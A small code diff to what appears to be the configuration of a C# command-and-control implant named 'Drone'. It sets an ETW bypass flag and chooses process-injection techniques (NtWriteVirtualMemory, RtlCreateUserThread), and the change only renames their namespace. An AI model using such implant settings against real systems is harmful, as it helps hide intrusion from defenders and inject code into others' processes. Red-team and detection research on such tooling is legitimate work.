@@ -100,7 +100,7 @@ namespace Drone
         private static int GetSleepJitter => 0;
         private static bool GetBypassAmsi => false;
         private static bool GetBypassEtw => true;
-        private static Type GetAllocationTechnique => typeof(DynamicInvocation.Injection.NtWriteVirtualMemory);
-        private static Type GetExecutionTechnique => typeof(DynamicInvocation.Injection.RtlCreateUserThread);
+        private static Type GetAllocationTechnique => typeof(Invocation.Injection.NtWriteVirtualMemory);
+        private static Type GetExecutionTechnique => typeof(Invocation.Injection.RtlCreateUserThread);
     }
 }
